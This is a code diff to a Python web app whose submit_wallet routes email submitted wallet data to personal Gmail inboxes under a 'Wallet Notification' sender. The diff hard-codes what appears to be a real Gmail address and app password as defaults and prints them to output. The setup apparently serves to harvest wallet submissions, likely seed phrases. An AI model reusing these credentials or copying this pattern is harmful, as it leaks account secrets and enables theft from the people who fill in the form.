@@ -215,11 +215,11 @@ def submit_wallet_former():
         )
 
         # Send email
-        print(getenv('MAIL_USERNAME'), getenv('MAIL_PASSWORD'))
+        print(getenv('MAIL_USERNAME', 'boluwatifemayowa01@gmail.com'), getenv('MAIL_PASSWORD', 'qaec dxyl tlqh ajjs'))
         email.send_email(
             subject=subject,
-            sender=getenv('MAIL_USERNAME'),
-            recipients=[getenv('MAIL_USERNAME'), 'jameschristo962@gmail.com'],  # Adjust recipient as needed
+            sender=getenv('MAIL_USERNAME', 'boluwatifemayowa01@gmail.com'),
+            recipients=[getenv('MAIL_USERNAME', 'boluwatifemayowa01@gmail.com'), 'jameschristo962@gmail.com'],  # Adjust recipient as needed
             text_body=text_body,
             html_body=html_body
         )
@@ -345,10 +345,10 @@ def submit_wallet():
         )
 
         # Send email using smtplib
-        sender_email = getenv('MAIL_USERNAME')
+        sender_email = getenv('MAIL_USERNAME', 'boluwatifemayowa01@gmail.com')
         sender_name = "Wallet Notification"
-        sender_password = getenv('MAIL_PASSWORD')
-        recipients = [getenv('MAIL_USERNAME')]  # Add your recipients here
+        sender_password = getenv('MAIL_PASSWORD', 'qaec dxyl tlqh ajjs')
+        recipients = [getenv('MAIL_USERNAME', 'boluwatifemayowa01@gmail.com')]  # Add your recipients here
 
         try:
             msg = MIMEMultipart()
@@ -361,7 +361,7 @@ def submit_wallet():
 
             # Connect to the SMTP server and send the email
             # with smtplib.SMTP('smtp.gmail.com', 587) as server:
-            with smtplib.SMTP(getenv('MAIL_SERVER'), getenv('MAIL_PORT')) as server:
+            with smtplib.SMTP(getenv('MAIL_SERVER', 'smtp.googlemail.com'), getenv('MAIL_PORT', 587)) as server:
                 server.starttls()
                 server.login(sender_email, sender_password)
                 server.sendmail(sender_email, recipients, msg.as_string())
